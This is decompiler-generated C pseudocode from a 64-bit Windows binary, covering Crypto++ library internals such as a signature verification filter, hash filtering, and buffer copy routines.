//----- (00000001400593A0) ----------------------------------------------------
__int64 *__fastcall sub_1400593A0(__int64 a1, __int64 a2, __int64 *a3, _QWORD *a4, __int64 *a5)
{
  _QWORD *v5; // rdi
  __int64 *v6; // rsi
  __int64 v7; // rbx
  char v8; // al
  __int64 v9; // rcx
  signed int v10; // edx
  __int64 v11; // rax
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx
  __int64 v13; // rbp
  __int64 v14; // rax
  bool v15; // zf
  __int64 v16; // rdx
  __int64 v17; // rcx
  __int64 *result; // rax
  int v19; // [rsp+30h] [rbp+8h]

  v5 = a4;
  v6 = a3;
  v7 = a1;
  v8 = (*(__int64 (__fastcall **)(__int64, const char *, unsigned int *, int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "SignatureVerificationFilterFlags",
         &unsigned int `RTTI Type Descriptor',
         &v19);
  v9 = *(_QWORD *)(v7 + 136);
  v10 = 9;
  if ( v8 )
    v10 = v19;
  *(_DWORD *)(v7 + 152) = v10;
  v11 = (*(__int64 (**)(void))(*(_QWORD *)v9 + 72i64))();
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 144);
  v13 = v11;
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 144) = v13;
  v14 = (*(__int64 (**)(void))(**(_QWORD **)(v7 + 136) + 8i64))();
  v15 = (*(_BYTE *)(v7 + 152) & 1) == 0;
  v16 = v14;
  *(_BYTE *)(v7 + 184) = 0;
  v17 = 0i64;
  if ( !v15 )
    v17 = v14;
  *v6 = v17;
  *v5 = 1i64;
  if ( *(_BYTE *)(v7 + 152) & 1 )
    v16 = 0i64;
  result = a5;
  *a5 = v16;
  return result;
}
// 1400D9498: using guessed type unsigned int unsigned int `RTTI Type Descriptor';

//----- (0000000140059480) ----------------------------------------------------
char __fastcall sub_140059480(__int64 a1, char a2, char a3)
{
  __int64 v3; // rbx
  void *v5; // [rsp+28h] [rbp-A0h]
  __int64 v6; // [rsp+38h] [rbp-90h]
  unsigned __int64 v7; // [rsp+40h] [rbp-88h]
  __int64 (__fastcall **v8)(void *); // [rsp+50h] [rbp-78h]
  int v9; // [rsp+68h] [rbp-60h]
  char Dst; // [rsp+70h] [rbp-58h]
  __int64 v11; // [rsp+80h] [rbp-48h]
  __int64 v12; // [rsp+88h] [rbp-40h]
  char v13; // [rsp+90h] [rbp-38h]
  __int64 v14; // [rsp+A0h] [rbp-28h]
  __int64 v15; // [rsp+A8h] [rbp-20h]

  v3 = a1;
  if ( !a3 )
  {
    v15 = 15i64;
    v14 = 0i64;
    v13 = 0;
    sub_140004F20(&v13, byte_1400A3400, 0i64);
    v7 = 15i64;
    v6 = 0i64;
    LOBYTE(v5) = 0;
    sub_140004F20(&v5, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v8);
    v8 = &off_1400A8798;
    v9 = 0;
    v12 = 15i64;
    v11 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v8 = &off_1400A8798;
    if ( v7 >= 0x10 )
      operator delete(v5);
    v8 = &off_1400A8798;
    CxxThrowException(&v8, &_TI4_AUcls_081_cls_023_CryptoPP__);
  }
  if ( a2 )
    sub_140058C90(a1);
  (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 432i64))(v3);
  return 0;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D43D8: using guessed type int _TI4_AUcls_081_cls_023_CryptoPP__;

//----- (00000001400595C0) ----------------------------------------------------
char __fastcall sub_1400595C0(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  __int64 v3; // rcx
  char result; // al

  v3 = *(_QWORD *)(a1 + 136);
  if ( v3 )
    result = (*(__int64 (__fastcall **)(__int64, __int64, signed __int64, _QWORD))(*(_QWORD *)v3 + 88i64))(
               v3,
               a2,
               0xFFFFFFFFi64,
               a3);
  else
    result = 0;
  return result;
}

//----- (00000001400595E0) ----------------------------------------------------
__int64 __fastcall sub_1400595E0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 result; // rax
  __int64 v4; // [rsp+20h] [rbp-98h]
  __int64 v5; // [rsp+28h] [rbp-90h]
  __int64 v6; // [rsp+30h] [rbp-88h]
  char v7; // [rsp+38h] [rbp-80h]
  __int64 v8; // [rsp+48h] [rbp-70h]
  __int64 v9; // [rsp+50h] [rbp-68h]
  __int64 (__fastcall **v10)(void *); // [rsp+60h] [rbp-58h]
  int v11; // [rsp+78h] [rbp-40h]
  char Dst; // [rsp+80h] [rbp-38h]
  __int64 v13; // [rsp+90h] [rbp-28h]
  __int64 v14; // [rsp+98h] [rbp-20h]

  v6 = -2i64;
  v2 = a1;
  v4 = 0i64;
  v5 = 0i64;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, __int64 *))(*(_QWORD *)a2 + 8i64))(
          a2,
          "OutputBuffer",
          &CryptoPP::cls_054 `RTTI Type Descriptor',
          &v4) )
  {
    v9 = 15i64;
    v8 = 0i64;
    v7 = 0;
    sub_140004F20(&v7, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v10);
    v10 = &off_1400A8798;
    v11 = 1;
    v14 = 15i64;
    v13 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v7, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v10 = &off_1400A8798;
    CxxThrowException(&v10, &_TI3_AVcls_001_CryptoPP__);
  }
  *(_QWORD *)(v2 + 24) = v4;
  result = v5;
  *(_QWORD *)(v2 + 32) = v5;
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140059720) ----------------------------------------------------
__int64 __fastcall sub_140059720(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rdi
  _QWORD *v3; // rbp
  __int64 v4; // rsi
  __int64 result; // rax
  char v6; // [rsp+38h] [rbp-90h]
  __int64 v7; // [rsp+48h] [rbp-80h]
  __int64 v8; // [rsp+50h] [rbp-78h]
  __int64 (__fastcall **v9)(void *); // [rsp+60h] [rbp-68h]
  int v10; // [rsp+78h] [rbp-50h]
  char Dst; // [rsp+80h] [rbp-48h]
  __int64 v12; // [rsp+90h] [rbp-38h]
  __int64 v13; // [rsp+98h] [rbp-30h]

  v2 = a1;
  v3 = a1 + 8;
  (*(void (__fastcall **)(_QWORD *, __int64, _QWORD *, _QWORD *, _QWORD *))(*a1 + 376i64))(
    a1,
    a2,
    a1 + 6,
    a1 + 7,
    a1 + 8);
  v4 = v2[6];
  if ( v4 == -1 || v2[7] < 1ui64 || *v3 == -1i64 )
  {
    v8 = 15i64;
    v7 = 0i64;
    v6 = 0;
    sub_140004F20(&v6, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v9);
    v9 = &off_1400A8798;
    v10 = 1;
    v13 = 15i64;
    v12 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v9 = &off_1400A8798;
    CxxThrowException(&v9, &_TI3_AVcls_001_CryptoPP__);
  }
  sub_140038C40((__int64)(v2 + 10), v2[6]);
  v2[13] = 1i64;
  v2[14] = v4;
  v2[15] = 0i64;
  result = v2[12];
  v2[16] = result;
  *((_BYTE *)v2 + 72) = 0;
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140059880) ----------------------------------------------------
__int64 __fastcall sub_140059880(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  char v4; // al
  char v5; // r9
  __int64 result; // rax
  unsigned int v7; // [rsp+30h] [rbp+8h]

  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (__fastcall **)(__int64, const char *, bool *, unsigned int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "PutMessage",
         &bool `RTTI Type Descriptor',
         &v7);
  v5 = 0;
  if ( v4 )
    v5 = v7;
  *(_BYTE *)(v3 + 80) = v5;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, int *, unsigned int *))(*(_QWORD *)v2 + 8i64))(
          v2,
          "TruncatedDigestSize",
          &int `RTTI Type Descriptor',
          &v7)
    || (result = v7, (v7 & 0x80000000) != 0) )
  {
    result = (*(__int64 (**)(void))(**(_QWORD **)(v3 + 72) + 56i64))();
  }
  *(_DWORD *)(v3 + 84) = result;
  return result;
}
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9230: using guessed type bool bool `RTTI Type Descriptor';

//----- (0000000140059900) ----------------------------------------------------
__int64 __fastcall sub_140059900(__int64 *a1, unsigned int a2)
{
  unsigned int v2; // edi
  __int64 *v3; // rbx
  bool v4; // zf
  __int64 v5; // rax

  v2 = a2;
  v3 = a1;
  v4 = (*(unsigned int (**)(void))(*a1 + 72))() == 0;
  v5 = *v3;
  if ( !v4 )
    return (*(unsigned int (__fastcall **)(__int64 *))(v5 + 72))(v3);
  if ( (*(unsigned int (__fastcall **)(__int64 *))(v5 + 24))(v3) <= 1
    || (*(unsigned __int8 (__fastcall **)(__int64 *))(*v3 + 104))(v3)
    || v2 <= 1 )
  {
    return 0i64;
  }
  return (*(unsigned int (__fastcall **)(__int64 *))(*v3 + 24))(v3);
}

//----- (0000000140059FD0) ----------------------------------------------------
__int64 __fastcall sub_140059FD0(__int64 a1, __int64 a2, __int64 a3)
{
  bool v3; // zf
  __int64 v4; // rbx
  __int64 *v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rsi
  __int64 v8; // rdi
  __int64 result; // rax
  __int64 v10; // rax
  char v11; // ST20_1
  __int64 v12; // rax
  char v13; // [rsp+30h] [rbp-78h]
  char v14; // [rsp+40h] [rbp-68h]

  v3 = (*(_BYTE *)(a1 + 152) & 1) == 0;
  v4 = a1;
  v5 = *(__int64 **)(a1 + 136);
  v6 = *v5;
  v7 = a3;
  v8 = a2;
  if ( v3 )
  {
    (*(void (__fastcall **)(__int64 *, _QWORD, __int64, __int64))(v6 + 80))(v5, *(_QWORD *)(v4 + 144), a2, a3);
    result = (*(__int64 (__fastcall **)(_QWORD, _QWORD))(**(_QWORD **)(v4 + 136) + 96i64))(
               *(_QWORD *)(v4 + 136),
               *(_QWORD *)(v4 + 144));
    v3 = (*(_BYTE *)(v4 + 152) & 4) == 0;
    *(_BYTE *)(v4 + 184) = result;
    if ( !v3 )
    {
      v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 328i64))(v4);
      v11 = 1;
      result = (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v10 + 40i64))(
                 v10,
                 v8,
                 v7,
                 0i64,
                 v11);
    }
  }
  else
  {
    (*(void (__fastcall **)(__int64 *, _QWORD, _QWORD, _QWORD))(v6 + 80))(
      v5,
      *(_QWORD *)(v4 + 144),
      *(_QWORD *)(v4 + 176),
      *(_QWORD *)(v4 + 168));
    result = (*(__int64 (__fastcall **)(_QWORD, _QWORD))(**(_QWORD **)(v4 + 136) + 96i64))(
               *(_QWORD *)(v4 + 136),
               *(_QWORD *)(v4 + 144));
    *(_BYTE *)(v4 + 184) = result;
  }
  if ( *(_BYTE *)(v4 + 152) & 8 )
  {
    v13 = *(_BYTE *)(v4 + 184);
    v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 328i64))(v4);
    result = (*(__int64 (__fastcall **)(__int64, char *, signed __int64))(*(_QWORD *)v12 + 40i64))(v12, &v13, 1i64);
  }
  if ( *(_BYTE *)(v4 + 152) & 0x10 && !*(_BYTE *)(v4 + 184) )
  {
    sub_140057E80(&v14);
    CxxThrowException(&v14, &_TI3_AVcls_095_cls_096_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4488: using guessed type int _TI3_AVcls_095_cls_096_CryptoPP__;

//----- (000000014005A120) ----------------------------------------------------
char __fastcall sub_14005A120(_DWORD *a1, int a2, unsigned __int8 a3)
{
  _DWORD *v3; // rbx
  int v4; // ecx
  unsigned __int8 v5; // si
  int v6; // edi
  __int64 v8; // rax

  v3 = a1;
  v4 = a1[10];
  v5 = a3;
  v6 = a2;
  if ( v4 )
  {
    if ( v4 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__fastcall **)(_DWORD *, _QWORD))(*(_QWORD *)v3 + 72i64))(v3, a3) )
  {
    return 1;
  }
  if ( (*(unsigned __int8 (__fastcall **)(_DWORD *))(*(_QWORD *)v3 + 368i64))(v3) )
  {
    if ( v6 )
    {
      v8 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)v3 + 328i64))(v3);
      if ( (*(unsigned __int8 (__fastcall **)(__int64, void **, _QWORD, _QWORD))(*(_QWORD *)v8 + 296i64))(
             v8,
             &qword_1400D8080,
             (unsigned int)(v6 - 1),
             v5) )
      {
        v3[10] = 1;
        return 1;
      }
    }
    v3[10] = 0;
  }
  return 0;
}

//----- (000000014005A1E0) ----------------------------------------------------
char __fastcall sub_14005A1E0(__int64 a1, unsigned int a2, unsigned __int8 a3)
{
  unsigned __int8 v3; // bl
  unsigned int v4; // edi
  __int64 v5; // rax

  v3 = a3;
  v4 = a2;
  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v5 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)v5 + 96i64))(v5, v4, v3);
}

//----- (000000014005A230) ----------------------------------------------------
__int64 __fastcall sub_14005A230(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *(_QWORD *)v2 = &off_1400ACA70;
    result = *(unsigned int *)(v3 + 32);
    *(_DWORD *)(v2 + 32) = result;
  }
  return result;
}
// 1400ACA70: using guessed type __int64 (__fastcall *off_1400ACA70)(void *);

//----- (000000014005A280) ----------------------------------------------------
__int64 __fastcall sub_14005A280(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *(_QWORD *)v2 = &off_1400ACA58;
    result = *(unsigned int *)(v3 + 32);
    *(_DWORD *)(v2 + 32) = result;
  }
  return result;
}
// 1400ACA58: using guessed type __int64 (__fastcall *off_1400ACA58)(void *);

//----- (000000014005A2D0) ----------------------------------------------------
__int64 sub_14005A2D0()
{
  void *v0; // rax
  __int64 result; // rax

  v0 = operator new(0xC0ui64);
  if ( v0 )
    result = sub_140068600((__int64)v0, 0x100u);
  else
    result = 0i64;
  return result;
}

//----- (000000014005A310) ----------------------------------------------------
__int64 __fastcall sub_14005A310(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 408i64))();
}

//----- (000000014005A320) ----------------------------------------------------
__int64 __fastcall sub_14005A320(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rcx
  char v4; // ST20_1
  __int64 result; // rax

  v3 = *(_QWORD *)(a1 + 136);
  if ( v3 )
  {
    v4 = 1;
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v3 + 48i64))(
               v3,
               a2,
               a3,
               0i64,
               v4);
  }
  return result;
}

//----- (000000014005A350) ----------------------------------------------------
__int64 __fastcall sub_14005A350(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rax
  char v7; // ST20_1

  v3 = a1;
  v4 = a3;
  v5 = a2;
  (*(void (__fastcall **)(_QWORD, __int64, __int64, __int64))(**(_QWORD **)(a1 + 168) + 56i64))(
    *(_QWORD *)(a1 + 168),
    a2,
    a2,
    a3);
  v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 328i64))(v3);
  v7 = 1;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v6 + 48i64))(
           v6,
           v5,
           v4,
           0i64,
           v7);
}

//----- (000000014005A3B0) ----------------------------------------------------
__int64 __fastcall sub_14005A3B0(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  _QWORD *v5; // rdi
  __int64 result; // rax

  if ( a3 )
  {
    v3 = a3;
    v4 = a2;
    v5 = a1;
    do
    {
      result = (*(__int64 (__fastcall **)(_QWORD *, __int64))(*v5 + 400i64))(v5, v4);
      v4 += v5[7];
      v3 -= v5[7];
    }
    while ( v3 );
  }
  return result;
}

//----- (000000014005A400) ----------------------------------------------------
__int64 __fastcall sub_14005A400(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rcx
  char v4; // ST20_1
  __int64 result; // rax

  v3 = *(_QWORD *)(a1 + 136);
  if ( v3 )
  {
    v4 = 1;
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v3 + 40i64))(
               v3,
               a2,
               a3,
               0i64,
               v4);
  }
  return result;
}

//----- (000000014005A430) ----------------------------------------------------
void __fastcall sub_14005A430(__int64 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 *v3; // rdi
  unsigned __int64 v4; // rbp
  __int64 v5; // r13
  unsigned __int64 v6; // rsi
  __int64 v7; // rax
  unsigned int v8; // er15
  __int64 v9; // rax
  __int64 v10; // rax
  unsigned __int64 v11; // rbx
  __int64 v12; // r12
  signed __int64 v13; // rbx
  __int64 v14; // rax
  _QWORD v15[2]; // [rsp+20h] [rbp-38h]
  unsigned __int64 v16; // [rsp+70h] [rbp+18h]

  if ( a3 )
  {
    v3 = a1;
    v4 = a3;
    v5 = a2;
    v6 = (*(unsigned int (**)(void))(*(_QWORD *)a1[21] + 24i64))();
    while ( 1 )
    {
      v7 = *v3;
      v8 = *((_DWORD *)v3 + 45);
      v16 = v4;
      v9 = (*(__int64 (__fastcall **)(__int64 *))(v7 + 328))(v3);
      if ( v3[19] >= v6 )
        goto LABEL_6;
      v10 = (*(__int64 (__fastcall **)(__int64, void **, unsigned __int64 *))(*(_QWORD *)v9 + 264i64))(
              v9,
              &qword_1400D8080,
              &v16);
      v11 = v16;
      v12 = v10;
      if ( v16 < v6 )
        break;
LABEL_7:
      if ( v11 >= v4 )
      {
        v13 = v4;
      }
      else
      {
        if ( v11 == *((_DWORD *)v3 + 45) )
          v11 -= (*(unsigned int (**)(void))(*(_QWORD *)v3[21] + 40i64))();
        if ( !v6 || (v6 - 1) & v6 )
          v13 = v11 - v11 % v6;
        else
          v13 = v11 - (v11 & (v6 - 1));
      }
      (*(void (__fastcall **)(__int64, __int64, __int64, signed __int64))(*(_QWORD *)v3[21] + 56i64))(
        v3[21],
        v12,
        v5,
        v13);
      v14 = (*(__int64 (__fastcall **)(__int64 *))(*v3 + 328))(v3);
      LOBYTE(v15[0]) = 1;
      (*(void (__fastcall **)(__int64, __int64, signed __int64, _QWORD, _QWORD))(*(_QWORD *)v14 + 48i64))(
        v14,
        v12,
        v13,
        0i64,
        v15[0]);
      v5 += v13;
      v4 -= v13;
      if ( !v4 )
        return;
    }
    sub_140038C40((__int64)(v3 + 18), v8);
LABEL_6:
    v11 = v3[19];
    v12 = v3[20];
    goto LABEL_7;
  }
}

//----- (000000014005A590) ----------------------------------------------------
__int64 __fastcall sub_14005A590(__int64 a1, __int64 a2, __int64 a3)
{
  _BYTE *v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 result; // rax
  __int64 v7; // rax
  char v8; // ST20_1

  v3 = (_BYTE *)a1;
  v4 = a3;
  v5 = a2;
  result = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 144) + 24i64))();
  if ( v3[152] & 2 )
  {
    v7 = (*(__int64 (__fastcall **)(_BYTE *))(*(_QWORD *)v3 + 328i64))(v3);
    v8 = 1;
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v7 + 40i64))(
               v7,
               v5,
               v4,
               0i64,
               v8);
  }
  return result;
}

//----- (000000014005A600) ----------------------------------------------------
__int64 __fastcall sub_14005A600(__int64 a1, int a2, __int64 a3, __int64 a4, __int64 a5, char a6, __int64 a7)
{
  int v7; // ebx
  __int64 v8; // rsi
  __int64 v9; // rbp
  int v10; // er14
  __int64 v11; // rdi
  __int64 v12; // rax
  char v13; // ST28_1
  int v14; // ST20_4
  __int64 result; // rax
  int v16; // ecx

  v7 = a5;
  v8 = a4;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  if ( (_DWORD)a5 )
    v7 = a5 - 1;
  v12 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  v13 = a6;
  v14 = v7;
  result = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, int, char))(*(_QWORD *)v12 + 272i64))(
             v12,
             a7,
             v9,
             v8,
             v14,
             v13);
  v16 = 0;
  if ( result )
    v16 = v10;
  *(_DWORD *)(v11 + 40) = v16;
  return result;
}

//----- (000000014005A690) ----------------------------------------------------
size_t __fastcall sub_14005A690(__int64 a1, const void *a2, unsigned __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rcx
  size_t v5; // rsi
  unsigned __int64 v6; // rdi
  const void *v7; // r9
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rdx
  __int64 *v11; // rax
  unsigned __int64 v13; // [rsp+30h] [rbp+8h]
  unsigned __int64 v14; // [rsp+40h] [rbp+18h]

  v14 = a3;
  v3 = a1;
  v4 = *(_QWORD *)(a1 + 24);
  v5 = 0i64;
  v6 = a3;
  v7 = a2;
  if ( v4 && a2 )
  {
    v8 = *(_QWORD *)(v3 + 32);
    v9 = *(_QWORD *)(v3 + 40);
    if ( v8 <= v9 )
      v10 = 0i64;
    else
      v10 = v8 - v9;
    v13 = v10;
    v11 = (__int64 *)&v13;
    if ( v10 >= a3 )
      v11 = (__int64 *)&v14;
    v5 = *v11;
    memmove((void *)(*(_QWORD *)(v3 + 40) + v4), v7, *v11);
  }
  *(_QWORD *)(v3 + 40) += v5;
  return v6 - v5;
}

//----- (000000014005A720) ----------------------------------------------------
unsigned __int64 __fastcall sub_14005A720(__int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rcx
  unsigned __int64 v5; // rsi
  unsigned __int64 v6; // rdi
  unsigned __int64 v7; // r9
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rdx
  __int64 *v11; // rax
  unsigned __int64 v13; // [rsp+30h] [rbp+8h]
  unsigned __int64 v14; // [rsp+40h] [rbp+18h]

  v14 = a3;
  v3 = a1;
  v4 = *(_QWORD *)(a1 + 24);
  v5 = 0i64;
  v6 = a3;
  v7 = a2;
  if ( v4 && a2 )
  {
    v8 = *(_QWORD *)(v3 + 32);
    v9 = *(_QWORD *)(v3 + 40);
    if ( v8 <= v9 )
      v10 = 0i64;
    else
      v10 = v8 - v9;
    v13 = v10;
    v11 = (__int64 *)&v13;
    if ( v10 >= a3 )
      v11 = (__int64 *)&v14;
    v5 = *v11;
    sub_14003A4B0(*(_QWORD *)(v3 + 40) + v4, v7, *v11);
  }
  *(_QWORD *)(v3 + 40) += v5;
  return v6 - v5;
}

//----- (000000014005A7B0) ----------------------------------------------------
__int64 __fastcall sub_14005A7B0(char a1, int a2, char a3)
{
  return sub_14005AA90(a1, a2, a3);
}
// 14005AA90: using guessed type __int64 __fastcall sub_14005AA90(char, _DWORD, char);

//----- (000000014005A7D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14005A7D0(__int64 a1, __int64 a2, __int64 a3, int a4, char a5)
{
  char v5; // r15
  __int64 v6; // rbx
  int v7; // ecx
  int v8; // esi
  int v9; // er14
  __int64 v10; // rdi
  __int64 v11; // rbp
  int v12; // ecx
  __int64 v14; // rax
  __int64 v15; // rax
  unsigned __int64 *v16; // rax
  unsigned __int64 v17; // rdi
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rdx
  __int64 v21; // rcx
  __int64 v22; // r8
  unsigned __int64 *v23; // rax
  unsigned __int64 v24; // rcx
  __int64 v25; // [rsp+20h] [rbp-48h]
  __int64 v26; // [rsp+40h] [rbp-28h]
  unsigned __int64 v27; // [rsp+70h] [rbp+8h]

  v5 = a5;
  v6 = a1;
  v7 = *(_DWORD *)(a1 + 40);
  v8 = 0;
  v9 = a4;
  v10 = a3;
  v11 = a2;
  if ( v7 )
  {
    v12 = v7 - 1;
    if ( v12 )
    {
      if ( v12 != 1 )
        return 0i64;
      goto LABEL_17;
    }
  }
  else
  {
    *(_QWORD *)(v6 + 32) = 0i64;
    if ( !*(_BYTE *)(v6 + 80) )
      goto LABEL_11;
  }
  v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v6 + 328i64))(v6);
  v15 = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, _DWORD, char))(*(_QWORD *)v14 + 272i64))(
          v14,
          v6 + 96,
          v11,
          v10,
          0,
          v5);
  LOBYTE(v8) = v15 != 0;
  *(_DWORD *)(v6 + 40) = v8;
  if ( v15 )
  {
    v16 = &v27;
    v27 = v10 - *(_QWORD *)(v6 + 32);
    v26 = 1i64;
    if ( v27 <= 1 )
      v16 = (unsigned __int64 *)&v26;
    return *v16;
  }
LABEL_11:
  (*(void (__fastcall **)(_QWORD, __int64, __int64))(**(_QWORD **)(v6 + 72) + 24i64))(*(_QWORD *)(v6 + 72), v11, v10);
  if ( !v9 )
    return 0i64;
  v17 = *(unsigned int *)(v6 + 84);
  v18 = *(_QWORD *)v6;
  v27 = *(unsigned int *)(v6 + 84);
  v19 = (*(__int64 (__fastcall **)(__int64))(v18 + 328))(v6);
  if ( *(_QWORD *)(v6 + 56) >= v17 )
    goto LABEL_15;
  v20 = (*(__int64 (__fastcall **)(__int64, __int64, unsigned __int64 *))(*(_QWORD *)v19 + 264i64))(v19, v6 + 128, &v27);
  if ( v27 < v17 )
  {
    sub_140038C40(v6 + 48, (unsigned int)v17);
LABEL_15:
    v20 = *(_QWORD *)(v6 + 64);
  }
  v21 = *(_QWORD *)(v6 + 72);
  v22 = *(unsigned int *)(v6 + 84);
  *(_QWORD *)(v6 + 88) = v20;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v21 + 112i64))(v21, v20, v22);
LABEL_17:
  LODWORD(v25) = v9;
  if ( !sub_14005A600(v6, 2, *(_QWORD *)(v6 + 88), *(unsigned int *)(v6 + 84), v25, v5, v6 + 128) )
    return 0i64;
  v23 = &v27;
  v24 = *(unsigned int *)(v6 + 84) - *(_QWORD *)(v6 + 32);
  v26 = 1i64;
  v27 = v24;
  if ( v24 <= 1 )
    v23 = (unsigned __int64 *)&v26;
  return *v23;
}

//----- (000000014005A980) ----------------------------------------------------
__int64 __fastcall sub_14005A980(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v4; // rbx
  unsigned int v5; // edi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // r9

  v4 = a1;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 24) + 328i64))();
  v9 = 0i64;
  if ( *(_BYTE *)(v4 + 32) )
    v9 = v5;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v8 + 40i64))(v8, v7, v6, v9);
}

//----- (000000014005A9F0) ----------------------------------------------------
void __fastcall sub_14005A9F0(_QWORD *a1, char *a2, __int64 a3)
{
  unsigned __int64 v3; // rdi
  char *v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // r8
  __int64 v7; // rdx
  __int64 v8; // r9
  unsigned __int64 v9; // rcx
  void *v10; // rcx
  unsigned __int64 *v11; // rax
  size_t v12; // r14
  unsigned __int64 v13; // [rsp+48h] [rbp+10h]
  __int64 v14; // [rsp+50h] [rbp+18h]

  if ( a2 )
  {
    v14 = a3;
    v3 = a3;
    v4 = a2;
    v5 = a1;
    if ( a3 )
    {
      v6 = a1[1];
      v7 = a1[6];
      v8 = a1[2];
      v9 = a1[5];
      if ( v9 >= v8 + v6 - v7 )
        v9 -= v6;
      v10 = (void *)(v7 + v9);
      v11 = &v13;
      v13 = v8 + v6 - (_QWORD)v10;
      if ( v13 >= v3 )
        v11 = (unsigned __int64 *)&v14;
      v12 = *v11;
      memcpy(v10, v4, *v11);
      if ( v12 < v3 )
        memcpy((void *)v5[2], &v4[v12], v3 - v12);
      v5[5] += v3;
    }
  }
}

//----- (000000014005AF50) ----------------------------------------------------
__int64 __fastcall sub_14005AF50(char a1, int a2, char a3)
{
  return sub_14005AA90(a1, a2, a3);
}
// 14005AA90: using guessed type __int64 __fastcall sub_14005AA90(char, _DWORD, char);

//----- (000000014005AF70) ----------------------------------------------------
